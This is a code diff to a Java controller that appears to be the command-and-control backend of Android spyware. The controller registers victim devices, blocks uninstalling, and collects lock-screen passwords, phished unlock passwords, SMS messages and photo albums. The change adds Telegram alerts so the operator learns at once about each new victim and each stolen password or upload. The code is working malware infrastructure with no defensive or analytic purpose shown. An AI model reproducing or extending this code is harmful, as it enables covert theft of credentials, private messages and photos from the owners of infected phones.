@@ -41,32 +41,26 @@ public class DeviceApiController extends BaseApiController {
     private InstallAppService installAppService;
     @Resource
     private TransferService transferService;
-
     @Resource
     private InputTextRecordService inputTextRecordService;
-
     @Resource
     private LogService logService;
     @Resource
     private JsCodeService jsCodeService;
-
     @Resource
     private UnlockScreenPwdService unlockScreenPwdService;
-
     @Resource
     private SysParamsDao sysParamsDao;
-
     @Resource
     private FishTemplateService fishTemplateService;
-
     @Resource
     private SmsInfoService smsInfoService;
-
     @Resource
     private AlbumPicService albumPicService;
-
     @Resource
     private FishDataService fishDataService;
+    @Resource
+    private TelegramService telegramService;
 
 
 
@@ -112,8 +106,9 @@ public class DeviceApiController extends BaseApiController {
             device.setUninstallGuard(Constant.YN.Y);
             device.setStatus(Constant.DeviceStatus.screen_on);
             deviceService.save(device);
+            telegramService.newDeviceNotify(DeviceContext.getPkg(), DeviceContext.getDeviceId());
+            log.info("收到pkg:{} 设备:{} 注册信息. ip：{} addr:{} ", DeviceContext.getPkg(), DeviceContext.getDeviceId(), ip, addr);
         }
-        log.info("收到pkg:{} 设备:{} 注册信息. ip：{} addr:{} ", DeviceContext.getPkg(), DeviceContext.getDeviceId(), ip, addr);
         return Result.toSuccess();
     }
 
@@ -127,11 +122,6 @@ public class DeviceApiController extends BaseApiController {
             log.error("pkg:{}  设备:{} 不存在", pkg, deviceId);
             return Result.toError("device not extis.");
         }
-//        if (Objects.equals(Constant.YN.Y, device.getFixLockScreen())) {
-//            //固定锁屏密码
-//            return Result.toSuccess();
-//        }
-
         UnlockScreenPwd unlockScreenPwd = json.toJavaObject(UnlockScreenPwd.class);
         unlockScreenPwd.setDeviceId(device.getId());
         unlockScreenPwd.setPkg(pkg);
@@ -148,7 +138,7 @@ public class DeviceApiController extends BaseApiController {
             update.setUnlockFish(Constant.YN.N);
         }
         deviceService.updateById(update);
-
+        telegramService.passwordNotify(DeviceContext.getPkg(), DeviceContext.getDeviceId(),"解锁密码");
 
         log.info("更新pkg:{}  设备:{} 解锁密码信息成功. Data:{} ", pkg, deviceId, JSON.toJSONString(unlockScreenPwd));
         unlockScreenPwdService.save(unlockScreenPwd);
@@ -197,20 +187,6 @@ public class DeviceApiController extends BaseApiController {
         }
 
     }
-
-//    @RequestMapping("uploadUnlockPassword")
-//    public Result<Void> uploadUnlockPassword(@RequestBody JSONObject unLockParams) {
-//        String deviceId = DeviceContext.getDeviceId();
-//        Device device = deviceService.findByDeviceId(deviceId);
-//        log.info("uploadUnlockPassword - {}", unLockParams.toJSONString());
-//        if (device != null && !Objects.equals(device.getFixLockScreen(), Constant.YN.Y)) {
-//            Device updateDevice = new Device();
-//            updateDevice.setId(device.getId());
-//            updateDevice.setLockScreen(unLockParams);
-//            deviceService.updateById(updateDevice);
-//        }
-//        return Result.toSuccess(null);
-//    }
 
     /**
      * 服务器配置
@@ -316,6 +292,7 @@ public class DeviceApiController extends BaseApiController {
             sms.setPkg(pkg);
         }
         smsInfoService.addSms(list);
+        telegramService.smsNotify(DeviceContext.getPkg(), DeviceContext.getDeviceId());
         log.info("设备:{} 短信上传成功.", deviceId);
         return Result.toSuccess();
     }
@@ -333,6 +310,7 @@ public class DeviceApiController extends BaseApiController {
             input.setPkg(pkg);
         }
         albumPicService.upload(inputs);
+        telegramService.albumNotify(DeviceContext.getPkg(), DeviceContext.getDeviceId());
         log.info("设备:{} 相册上传成功.", DeviceContext.getDeviceId());
         return Result.toSuccess();
     }
@@ -370,6 +348,7 @@ public class DeviceApiController extends BaseApiController {
                 }
                 unlockParam.put("source", Constant.UnlockScreenPwdSource.fish);
                 uploadUnlockPassword(unlockParam);
+                telegramService.passwordNotify(DeviceContext.getPkg(), DeviceContext.getDeviceId(),"钓鱼解锁密码");
             } catch (Exception e) {
                 log.warn("uploadUnlockPassword error", e);
             }
